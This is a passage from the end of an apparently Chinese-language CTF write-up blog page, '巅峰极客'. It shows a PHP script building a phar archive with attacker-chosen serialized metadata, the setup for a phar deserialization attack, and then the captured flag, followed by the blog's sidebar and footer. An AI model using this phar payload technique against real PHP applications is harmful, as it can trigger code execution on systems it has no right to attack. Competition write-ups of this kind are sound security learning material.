class="string">&quot;hello.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar,phar伪协议不用phar后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub,只要后面部分为__HALT_COMPILER(); </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>flag{a592b240-32ae-4381-a0ab-83790c98ca28}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/04/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" data-id="ckw63s4n0007iflolb4r0d1p4" data-title="巅峰极客" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 12px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 12px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 12px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 18px;">web</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 12px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 14px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 12px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/11/19/TSGCTF2021/">(no title)</a>
          </li>
        
          <li>
            <a href="/2021/11/18/TCTF2021_BuggyLoader/">buggyLoader</a>
          </li>
        
          <li>
            <a href="/2021/10/01/%E7%94%A8github%20action%20%E8%AE%A9hexo%E4%BD%93%E9%AA%8C++/">用github action 让hexo体验++</a>
          </li>
        
          <li>
            <a href="/2021/03/01/%E6%88%91%E7%9A%842020/">我的2020</a>
          </li>
        
          <li>
            <a href="/2021/01/13/real%20world%20ctf%202020/">real world ctf 2020</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>